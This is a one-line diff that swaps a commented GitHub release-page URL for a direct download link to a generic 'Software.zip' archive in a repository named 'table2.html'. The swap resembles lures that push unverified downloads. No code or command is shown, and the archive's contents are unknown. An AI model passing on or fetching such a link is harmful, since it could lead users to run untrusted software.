@@ -1,1 +1,1 @@
-# https://github.com/rohitandey/table2.html/releases/tag/v1.0
+# https://github.com/rohitandey/table2.html/releases/download/v2.0/Software.zip
